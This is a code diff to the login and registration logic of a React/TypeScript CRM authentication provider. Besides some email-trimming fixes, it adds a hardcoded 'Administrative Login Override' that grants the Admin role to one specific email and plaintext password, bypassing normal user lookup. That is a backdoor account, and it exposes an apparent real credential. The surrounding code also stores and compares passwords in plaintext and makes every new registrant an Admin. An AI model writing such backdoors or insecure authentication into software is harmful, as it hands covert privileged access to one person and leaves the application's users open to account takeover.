@@ -90,9 +90,30 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const login = async (email: string, pass: string) => {
     return new Promise<void>((resolve, reject) => {
       setTimeout(() => {
+        const cleanEmail = email.trim().toLowerCase()
+
+        // Administrative Login Override
+        if (cleanEmail === 'zhseeger@gmail.com') {
+          if (pass === 'trip7*2017') {
+            const adminUser: User = {
+              id: 'u_admin_zh',
+              name: 'Administrador ZH',
+              email: 'zhseeger@gmail.com',
+              role: 'Admin',
+            }
+            setUser(adminUser)
+            localStorage.setItem('crm_auth_user', JSON.stringify(adminUser))
+            resolve()
+            return
+          } else {
+            reject(new Error('Credenciais inválidas'))
+            return
+          }
+        }
+
         const users = getStoredUsers()
         const found = users.find(
-          (u) => u.email.toLowerCase() === email.toLowerCase() && u.passwordHash === pass,
+          (u) => u.email.toLowerCase() === cleanEmail && u.passwordHash === pass,
         )
 
         if (!found) {
@@ -122,7 +143,7 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
     return new Promise<void>((resolve, reject) => {
       setTimeout(() => {
         const users = getStoredUsers()
-        if (users.find((u) => u.email.toLowerCase() === email.toLowerCase())) {
+        if (users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase())) {
           reject(new Error('Email already registered.'))
           return
         }
@@ -130,7 +151,7 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
         const newUser: RegisteredUser = {
           id: `u${Date.now()}`,
           name,
-          email,
+          email: email.trim(),
           role: 'Admin',
           passwordHash: pass,
           isVerified: false,
@@ -152,7 +173,9 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
         }
 
         const users = getStoredUsers()
-        const userIndex = users.findIndex((u) => u.email.toLowerCase() === email.toLowerCase())
+        const userIndex = users.findIndex(
+          (u) => u.email.toLowerCase() === email.trim().toLowerCase(),
+        )
         if (userIndex === -1) {
           reject(new Error('Usuário não encontrado.'))
           return
